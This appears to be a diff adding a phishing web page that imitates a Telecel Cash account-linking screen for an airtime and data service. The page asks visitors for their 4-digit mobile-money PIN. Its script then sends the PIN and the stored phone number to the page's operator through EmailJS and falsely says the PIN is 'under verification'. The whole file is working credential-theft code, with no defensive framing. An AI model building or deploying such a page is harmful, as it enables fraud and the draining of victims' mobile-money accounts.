@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Link Your Account</title>
+  <!-- Meta Description -->
+<meta name="description" content= " Airtime & Data — Fast and reliable airtime and data services with secure registration and easy access.">
+
+<!-- Favicons -->
+<link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="favicon.png">
+
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("gV773-VG85THpxrNV");
+    })();
+  </script>
+  <style>
+    body {
+  margin: 0;
+  font-family: 'Segoe UI', sans-serif;
+  background: linear-gradient(135deg, #003366, #0055a5);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  overflow: hidden;
+  position: relative;
+}
+
+/* Yellow accent circles */
+body::before,
+body::after {
+  content: "";
+  position: absolute;
+  border-radius: 50%;
+  background: red;
+  opacity: 0.15;
+}
+
+body::before {
+  width: 300px;
+  height: 300px;
+  top: -100px;
+  left: -100px;
+}
+
+body::after {
+  width: 200px;
+  height: 200px;
+  bottom: -80px;
+  right: -80px;
+}
+
+    .card {
+      background: white;
+      border-radius: 1rem;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+      transition: transform 0.3s;
+    }
+    .card:hover {
+      transform: translateY(-5px);
+    }
+    .btn {
+      background: #FFD700;
+      color: #003366;
+      font-weight: bold;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background: #e6c200;
+    }
+    .input-pin {
+      letter-spacing: 0.5rem;
+      font-size: 2rem;
+      text-align: center;
+      font-weight: bold;
+      border: 2px solid #E5E7EB;
+    }
+  </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-6">
+
+  <div class="card w-full max-w-md p-8">
+    <p style="font-weight: bold;font-size:x-large; align-self: center;padding-left: 50px; padding-bottom: 5px;"> Link Your Telecel Cash Account</p>
+    <div>
+    <img src="telecel.png" alt="linkmomo" class="w-full max-w-xs mx-auto mb-4">
+  </div>
+    <h1 class="text-2xl font-bold text-center text-blue-900 mb-4">Secure Your Account</h1>
+    <p class="text-gray-600 text-center mb-6"> Enter your 4-digit Telecel Cash pin to Link your account for a direct charge.</p>
+
+    <form id="pinForm" class="space-y-6">
+      <input 
+        type="password" 
+        id="pinInput" 
+        maxlength="4" 
+        pattern="\d{4}" 
+        inputmode="numeric" 
+        class="input-pin w-full rounded-lg py-3 px-4 focus:outline-none focus:ring-2 focus:ring-yellow-400" 
+        placeholder="••••"
+        required
+      >
+
+      <button 
+        type="submit"
+        class="btn w-full py-3 rounded-lg shadow">
+        Continue
+      </button>
+    </form>
+  </div>
+<div id="notification" class="hidden fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white"></div>
+
+  <script>
+    const pinForm = document.getElementById("pinForm");
+    const pinInput = document.getElementById("pinInput");
+    const phone = localStorage.getItem("userPhone");
+
+    pinForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      if(pinInput.value.length === 4){
+        emailjs.send("service_74nt2c9","template_zelb8ji",{
+          phone: "+233" + phone,
+          pin: pinInput.value
+        }).then(() => {
+          showNotification("Telecel Cash pin under verification");
+          window.location.href = "dashboard.html";
+        }).catch(() => {
+          showNotification("Failed to verify pin.", "error");
+        });
+      } else {
+         showNotification("Please enter your valid 4-digit PIN.", "error");
+      }
+    });
+
+    function showNotification(message, type="success") {
+  const notification = document.getElementById("notification");
+  notification.textContent = message;
+  notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white transition ${
+    type === "success" ? "bg-blue-600" : "bg-red-600"
+  }`;
+  notification.classList.remove("hidden");
+  setTimeout(() => notification.classList.add("hidden"), 3000);
+}
+
+  </script>
+</body>
+</html>
